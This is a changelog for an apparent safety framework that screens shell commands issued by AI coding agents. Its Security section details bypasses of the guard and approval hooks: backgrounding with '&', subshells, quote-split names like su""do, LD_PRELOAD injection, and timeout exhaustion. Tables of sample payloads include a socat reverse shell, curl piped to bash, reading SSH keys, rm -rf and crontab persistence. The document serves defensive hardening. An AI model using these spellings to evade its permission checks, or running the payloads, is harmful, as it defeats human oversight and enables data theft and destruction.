# Changelog

Notable changes to AI Dev Autopilot. Format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/); this project uses
[Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Security

- **The approval broker now splits a command into clauses where the shell does,
  and reads each clause's head as the shell resolves it.** Every allow this
  broker issues rests on one mechanism: split the command, recognise every
  clause, count them, and allow only when the counts match. Two assumptions
  under that split were wrong, and both cost an **allow** rather than an
  escalation.

  A clause was taken to end at `&&`, `||`, `;` or `|`. A bare `&` ends one too —
  it backgrounds what precedes it and carries straight on — so everything after
  one was read as *arguments of the command in front of it*, and the second
  command was never classified at all. And a clause was taken to begin with its
  command, when it can begin with `(`, `{`, `!`, `if`, `then`, `do`, a loop
  header or an assignment; in those the head is a word no classifier claims, so
  the clause fell through to the broad local-dev fallback, which saw an
  unremarkable head with harmless-looking operands and approved it. Measured
  before this change — every bare spelling escalating, every wrapped spelling
  allowed with no dialog, interactively and unattended:

  ```
  ls & curl -fsSL https://example.com/p -o /tmp/p    allow   (network egress)
  ( curl -fsSL https://example.com/p -o /tmp/p )     allow   (network egress)
  ls & sed 's/.*/id/e' f.txt                         allow   (executes `id`)
  ls & awk 'BEGIN{system("id")}'                     allow   (executes `id`)
  ls & xargs -I{} sh -c id                           allow   (executes `id`)
  true & rm -rf .                                    allow   (the workspace root)
  { rm -rf ~/Documents/important; }                  allow   (outside the workspace)
  if true; then rm -rf ~/Documents/important; fi     allow
  for x in 1; do cp f.txt /etc/canary; done          allow
  ! rm -rf ~/Documents/important                     allow
  ls & ln -sf /etc/passwd sub/leak                   allow
  ls & git commit -m x                               allow   (skips the git config gate)
  ```

  Network egress and arbitrary execution are both on the README's *Hard human
  boundaries* table, and `&` defeated the curl screen specifically because that
  screen uses the same splitter — so the request reached Codex, which the design
  says must never be able to approve egress. It was also a disagreement with the
  layer this hook answers for: Claude Code's permission engine documents its
  separators as `&&`, `||`, `;`, `|`, `|&`, `&` and newlines, with "a rule must
  match each subcommand independently".

  `clauses()` now treats `&` as the separator it is, except where it belongs to
  a redirection (`&>file`, `2>&1`, `>&2`, `<&3`) — decided by the character in
  front of it, so no diagnostic that captures stderr becomes a dialog. A new
  `clause_head()` strips grouping punctuation, reserved words, wrappers and
  assignments to find the command, and answers three ways rather than two: a
  command remains, the clause runs nothing (`fi`, `done`, a closing brace, a
  loop header, a bare redirection — counted as recognised, which is what keeps
  `{ ls; }` and `if …; then ls; fi` silent), or it cannot be decomposed and
  escalates. That last case is why `case x in a) rm -rf /`, `coproc` and a
  function definition now escalate: they carry a command with no separator in
  front of it. `broad_safe_ok` refuses a bare reserved word as a second lock.

- **The broker now bounds the quantity that actually drives its cost.** Its
  oversize check caps the payload and the subject in *bytes*, which is what
  bounds the PreToolUse guard — every rule there is one scan over the subject.
  This hook is not shaped like that: it decomposes, dispatches and canonicalises
  **per clause**, so a command of many short clauses sits far inside the byte
  ceiling while costing far more. Measured against the 20 s timeout the settings
  fragment registers for it: 4 clauses 0.19 s, 400 clauses 7.1 s, and a 64 KiB
  command of clauses — inside the byte ceiling — **43 s**, well past
  cancellation. A cancelled broker renders no decision, which interactively
  means Claude Code asks the human and unattended means a dialog is raised for a
  human who is not there, instead of the request being denied and queued.
  `AI_DEV_MAX_CLAUSES` (default 64) caps the clause count; the worst admitted
  case is now 1.2 s, and the 64 KiB shape resolves in 1.5 s as an escalation
  instead of running past the timeout. Pinned by `tests/approval.test.sh`
  section 16g, which asserts the cap allows, the clause past it escalates, it
  denies overnight, and the 64 KiB shape answers inside the hook's own timeout.

- **The environment-injection screen now runs at all.** `broad_safe_ok`
  refused a clause led by `LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`,
  `BASH_ENV`, `ENV`, `PATH`, `CDPATH`, `PYTHONPATH`, `NODE_OPTIONS`,
  `PROMPT_COMMAND` or `GIT_CONFIG_*` — names that load code into, or re-point,
  whatever command follows them. But `seg_ok` stripped those assignments before
  calling it, so the loop never fired: the control was dead code, and it could
  not have covered the strict path in any case, because a clause the family
  grammars approve never reaches `broad_safe_ok` at all. Measured before this
  change, `LD_PRELOAD=/tmp/evil.so ls`, `PATH=/tmp/evil ls`,
  `BASH_ENV=/tmp/evil.sh ls` and `NODE_OPTIONS=--require=/tmp/x.js npm test`
  were all allowed with no dialog. The screen moved to `seg_ok`, above the
  dispatch, where the names are still in hand and every clause passes through
  it. `FOO=1 ls` and `NODE_ENV=test npm run build` are unchanged.

  `tests/approval.test.sh` section 16f proves both: it drives a copy of the
  shipped broker with the corrections reverted, asserts the pre-fix `allow` for
  every payload above, then asserts the shipped file escalates it and denies it
  overnight — with positive controls for `2>&1`, `&>`, `>&2`, a trailing `&`, a
  quoted ampersand, brace groups, subshells, `for`/`while`/`if` over routine
  work, ordinary assignments and benign wrappers.

- **The notebook tools are no longer invisible to both hooks.** NotebookEdit
  sends its path as `tool_input.notebook_path` (verified against the tool
  schema of the running Claude Code build), and both hooks read only
  `file_path`/`path`, so the subject came back empty and every path rule was
  absent for exactly one of the tools the settings fragment registers the
  hooks for. In the guard that was a hole in the ceiling: `NotebookEdit` of a
  notebook under the hub, or under `~/.ssh`, passed where `Edit` of the same
  location is denied. In the broker it was two different defects with the same
  cause: every `NotebookEdit` escalated as `edit-no-path` — safe, but the
  human approved every routine in-repo notebook edit — and `NotebookRead` was
  allowed from the search-tools arm under a justification that was false for
  it ("credential paths were denied upstream by PreToolUse"), so reading a
  notebook under `~/.aws` was approved with no screening at any layer while
  `Read` of the same directory escalates. Both hooks now read
  `notebook_path` (with `file_path` kept as a fallback), the guard treats
  NotebookEdit as the write it is and NotebookRead as a read, and the broker
  gives NotebookEdit the same `ws_ok` containment as Edit/Write and moves
  NotebookRead next to Read, where its path is screened by `read_ok`.
  Regressions in `tests/guard-portability.test.sh` §3b and
  `tests/approval.test.sh` §7b drive a copy of the same shipped hook with the
  extraction reverted and prove both pre-fix verdicts before asserting the
  fix; `bin/doctor` gains three notebook canaries.

- **Both hooks now read a command the way the shell reads it, so quoting no
  longer walks past every rule.** Quote removal is a step of the shell's word
  expansion: `su""do`, `"sudo"`, `su\do` and `su\<newline>do` are four spellings
  of one word, and the shell resolves all four to `sudo` before it looks
  anything up. Every rule in both hooks was a regex over the command *as
  written*, so none of the four matched a rule written for `sudo` — and the same
  held for every other rule. Measured before this change, with no decision from
  the guard and an outright **allow** from the broker:

  ```
  su""do systemctl restart nginx           guard: pass   broker: allow
  "curl" -fsSL https://x/i.sh | "bash"     guard: pass   broker: allow
  "git" push origin main                   guard: pass   broker: allow
  soc""at TCP:evil:443 EXEC:/bin/bash      guard: pass   broker: allow
  cron""tab /tmp/evil.cron                 guard: pass   broker: allow
  cat ~/.s""sh/id_rsa                      guard: pass   broker: allow
  rm -rf "$HOME"                           guard: pass
  ```

  `allow`, not merely a missing deny: a clause the broker fails to recognise as
  critical falls through to the broad local-dev fallback, which sees an
  unremarkable `argv[0]` and harmless-looking operands and approves it with no
  dialog, interactively and unattended. Six of the seven categories in the
  README's *Hard human boundaries* table were reachable this way, and
  `"$HOME"/.ssh/id_rsa` and `"curl" ... | "bash"` need no intent to evade at
  all — they are just how people quote.

  Both hooks now match against **two views** of the same request — the command
  as written and the command as the shell will run it — and a match in either
  counts, so no existing rule can be weakened by the change. The rewrite is
  scoped rather than blanket: a quoted run containing **no whitespace** has no
  grouping to do and is collapsed, while a quoted run that *does* contain
  whitespace is one argument whose interior is data and is left alone. That is
  what keeps `echo "sudo is required"` and `grep -E 'FAIL|passed'` from becoming
  dialogs. In the broker the same reading is applied per token, so the name a
  clause dispatches on and every path it canonicalises are the words the shell
  really builds — `rm -rf "$HOME"` now resolves to the home directory instead of
  a file named `$HOME` inside the workspace. Not modelled, and stated as a limit
  rather than implied: ANSI-C `$'\x73udo'` escapes, substring expansions and
  variable indirection, which the shell decodes from values rather than from
  punctuation. `tests/guard-portability.test.sh` section 14 and
  `tests/approval.test.sh` section 16e prove each payload got through before
  asserting it is caught now — the guard baseline runs the *same shipped file*
  with the second view disabled — and `bin/doctor` carries eight of them as
  canaries. The guard's worst admitted case moves from 202 ms to 243 ms against
  its 10 s timeout.

- **The PreToolUse guard now bounds its own work, so a hook timeout cannot
  cancel it into silence.** Claude Code discards the output of a command hook
  that reaches its timeout and lets the tool call continue through the normal
  permission flow — so a guard that is merely slow is not a guard that denies
  late, it is no guard at all. Every guard rule scans the whole command, at a
  measured 13.3 seconds for a 2 MiB command against a 10-second timeout, and in
  auto mode the tool call that outran the guard is auto-approved without a
  dialog, so the approval broker never sees it either. `hooks/security-guard.sh`
  now refuses a hook payload over 1 MiB (`oversize-payload`) or a command over
  64 KiB (`oversize-subject`) with a bash string-length check taken before any
  scan; `hooks/permission-broker.sh` applies the same two limits from the same
  variables and escalates. Both limits are overridable with
  `AI_DEV_MAX_INPUT_BYTES` and `AI_DEV_MAX_SUBJECT_BYTES`.
  `tests/guard-portability.test.sh` section 13 proves the slow path is real
  before proving the bound holds, and `bin/doctor` (`guard:workbound`)
  re-measures the worst admitted case against the timeout registered in the
  deployed settings.

- **The forge CLIs no longer write to a remote without a human.** The critical
  set caught `gh ... release ...` and nothing else, so `gh pr create`,
  `gh pr merge`, `gh repo delete`, `gh secret set`, `gh workflow run` and
  `gh api -X DELETE` were all approved with no dialog. Nothing here contains
  any of it — this machine is unchanged, which is exactly why the local
  controls had nothing to say. It was also a contradiction rather than only a
  gap: `permissions.ask` already lists `Bash(gh pr create *)` and the guard
  already asks for `gh release create`, and the broker — the layer that actually
  answers the dialog — overrode both. Matched as `<noun> <verb>` adjacently, so
  `gh pr list --search "create"` stays a read, as do `list`, `view`, `diff`,
  `checks` and a `gh api` GET. `glab` is covered the same way.

- **The sensitive-path screen no longer depends on punctuation.** The broad
  local-dev fallback resolved an operand only when it began `/`, `~/`, `./` or
  `../`, which is a guess about how a path is written rather than a test of what
  it names — so `somebuildtool ./.env` escalated while `somebuildtool .env`, the
  spelling everyone actually uses, was allowed. Same for
  `.github/workflows/ci.yml`, `.git/config` and `.mcp.json`. Any token
  containing a `/` or beginning with `.` is now resolved and checked; an
  ordinary word still is not, which is what keeps the loop from spawning a
  canonicalisation per argument.

- **`socat`, mounts and namespace tools are now human-only.** `socat` was
  missing from the network-egress list that already carried `nc`, `ncat`, `ssh`
  and `rsync`, while being strictly more capable than any of them —
  `socat TCP:host:443 EXEC:/bin/bash` is a reverse shell — and it is the one
  network tool this project installs itself in `make deps`. Alongside it, a new
  screen for the tools that move the ground every other rule stands on: every
  containment decision here canonicalises a path and asks whether it is inside
  the workspace, and `mount --bind`, `unshare`, `nsenter`, `chroot`, `setpriv`
  and `capsh` make a path mean something else or run a program somewhere none of
  it was measured against. All were previously approved with no dialog. They sit
  above Codex, because "does this change a file, process or remote state?" is a
  question an adjudicator can reasonably answer *no* to for `unshare … id`.

- **Scheduled execution is now a human decision.** The broad local-dev fallback
  trusts the sandbox and the guard to contain what it approves — an argument
  that holds for every command that runs *now* and fails for every command that
  runs *later*. Measured before this change, `crontab /tmp/evil.cron`,
  `at now + 1 minute -f /tmp/evil.sh`,
  `systemd-run --user --on-active=60 /tmp/evil.sh` and
  `systemctl --user enable evil.service` were all approved with no dialog. It is
  also the persistence class the `denyWrite` list cannot reach: `crontab` and
  `at` write under `/var/spool`, outside `$HOME` entirely, and `systemd-run`
  creates a transient unit over D-Bus and writes no file at all. The guard now
  asks and the broker escalates, above Codex, for `crontab` (writing forms),
  `at`, `batch`, `atrm`, `systemd-run`, `systemctl enable|reenable|preset|link|
  edit|add-wants|add-requires|set-property` and `loginctl enable-linger`.
  Reading the schedule — `crontab -l`, `atq`, `systemctl status|is-active|
  is-enabled|list-units|list-timers` — stays silent.

- **The managed enforcement floor now pins a minimum Claude Code version.**
  `sandbox.network.strictAllowlist` — the setting that makes the domain
  allowlist a control rather than a prompt a sandboxed command cannot answer —
  is honoured from 2.1.219; below that the key parses, is discarded, and nothing
  reports it. `requiredMinimumVersion: "2.1.219"` in
  `adapters/claude/managed-settings.json` makes an older build refuse to start
  instead. `claude update`, `claude install` and `claude doctor` are exempt from
  the check, so a machine below the floor can still upgrade its way out.
  `tests/permission-posture.test.sh` asserts the floor is at least the version
  the control it protects needs, and `bin/doctor` checks the running build.

### Added

- **CI.** `.github/workflows/contracts.yml` runs every model-free suite and
  `bin/doctor` on `ubuntu-24.04` for each push and pull request, on a machine
  where AI-DEV has never been installed and neither Claude Code nor Codex is
  present. A second job parses every script with `bash -n`, runs `shellcheck`
  (exclusions and their reasons in `.shellcheckrc`), and fails if `core/` has
  changed without `generated/AGENTS.md` being regenerated.

- **`tests/hook-contract.test.sh`** — the claim nobody was checking. Every other
  suite asserts what a hook *decided*; none asserted that Claude Code would act
  on it. If the decision shape drifts, an `allow` the CLI cannot parse is not a
  deny — it is no decision, so every routine command starts prompting again and
  the framework degrades into the approval fatigue it exists to solve, with
  every other assertion still passing. The suite pins the exact JSON each hook
  emits, including that a decision object carries no key outside the documented
  set, and checks that the installed Claude Code build still contains every
  field name those shapes are built from, with a negative control proving the
  search can tell present from absent.

### Fixed

- **An empty `credential.helper` escalated every git command.** The broker
  screens inherited `GIT_CONFIG_*` entries with the same execution test the
  file-backed configuration gets, and `credential.helper` is on that list
  because its value names a program. But the *empty* value is not a program:
  gitcredentials(7) documents it as the way to **reset the helper list to
  empty**, and it is exactly what a CI runner, a container image and this
  project's own unattended runner export to stop git prompting for credentials.
  Read as an execution channel, it made `git_config_gate` refuse on every
  invocation, so `git status`, `git diff`, `git add` and `git commit` — the four
  most frequent commands in this workflow — each cost a dialog, on precisely the
  machines with nobody there to answer one. Measured on the daily runner, it was
  95 of `approval.test.sh`'s assertions. The exemption is one key wide and the
  value is what earns it: a helper that names a program still escalates, a
  `!`-prefixed shell helper still escalates, and an empty `core.pager` or
  `core.hooksPath` is **not** exempted, because git documents nothing that makes
  either provably inert. The command-line route is unchanged — an assignment
  written in front of the command being classified is chosen by whatever is
  driving the session, and still escalates.

- **`aidev` passed `--add-dir` straight through.** It does two things the
  launcher exists to prevent: it grants tool access to another directory — and
  with `sandbox.autoAllowBashIfSandboxed`, a sandboxed command writing inside an
  allowed directory is approved with *no dialog*, so the flag widens the set of
  paths that change without anyone being asked — and Claude Code's own `--bare`
  help names it as the way to supply additional "CLAUDE.md dirs", so it also
  loads instructions from an unvetted tree. `hooks/permission-broker.sh` already
  refused to hand it to a nested session, so the judgement existed; it was
  missing from the entry point where a human types it. Now refused in both
  spellings, with a positive control that ordinary passthrough flags still work.

- **The approval broker emitted a key Claude Code does not define.** Its `allow`
  path carried an optional `addPermissionRule` object, which is not in the
  `PermissionRequest` decision schema — Claude Code drops an unrecognised key
  with one debug line and no error. No caller ever passed it, so it was a loaded
  trap rather than a live bug: the first use would have produced an accepted
  allow with the rule silently discarded. Removed;
  `updatedPermissions` is the current mechanism and should arrive with a test
  when something needs it.

- **An unattended denial now says why.** The broker computed a reason for the
  audit log and then emitted a bare `{"behavior":"deny"}`, leaving the model
  unable to tell "this needs a human tonight" from "this tool is broken" — the
  first is a reason to take a different route, the second is a reason to retry
  all night. `message` is part of the deny shape, so the reason, the rule id and
  the pointer to `var/pending-approvals.log` are now carried in it.

- **`curl --tls-max` escalated a request it should have allowed.** The option
  was declared both as a standalone flag and as one that carries a value; the
  standalone branch matched first, so its value was left to be read as a
  positional and `curl --tls-max 1.3 http://localhost:8080/health` looked like
  two URLs. Fail-closed, but wrong, and invisible to anyone reading either list
  on its own — found by shellcheck's SC2221/SC2222, which is part of why the
  lint job now exists. `tests/approval.test.sh` pins both the allow and the
  control that the same option does not make a remote host local.

### Changed

- **`bin/doctor` now answers three ways, and `make test` no longer says
  CONTRACT TESTS FAILED on a fresh clone.** Most of what doctor inspects lives
  outside the repository — `~/.claude`, `~/.codex`, `/etc`, `$PATH` — and none of
  it exists until `make sync` has run, so a first run reported a dozen failures
  that all meant "you have not installed this yet", burying anything real. Those
  checks now report **PENDING** and doctor exits **3**, which `tests/run-all.sh`
  routes to the same "awaiting `make sync`" path the suites already use. A
  machine that has been synced and then drifted is still a failure, and
  `tests/doctor-reporting.test.sh` pins both directions so the category cannot
  be used to hide drift by deleting a file.
- **Codex's absence is a warning, not a failed contract.** Codex CLI is
  documented as optional and the framework is designed so that losing it fails
  closed — the broker's gray cases escalate to the human instead of being
  adjudicated. The check that asks whether Codex accepts the hub config now skips
  when Codex is not installed, rather than concluding the config is rejected.

## [0.1.0]

Initial public release.

Everything described in [README.md](README.md) and
[docs/verification.md](docs/verification.md) ships in this release:

- **`bin/aidev`** — the launcher, which keeps repository-supplied configuration
  out of a session.
- **`hooks/security-guard.sh`** — the deterministic PreToolUse ceiling.
- **`hooks/permission-broker.sh`** — the delegated approval broker, which
  answers routine permission dialogs and escalates everything else.
- **`bin/codex-review`** — the ephemeral, read-only, offline, keyless
  independent reviewer.
- **`bin/doctor`** and **`bin/host-check`** — configuration and behaviour
  verification, inside and outside the sandbox.
- **`core/`** — the policy, projected onto Claude Code and Codex adapters by
  `bin/ai-dev sync`.
- **`skills/`** — `project-bootstrap` and `codex-council`.
- **`tests/`** — the contract suites listed in the README.
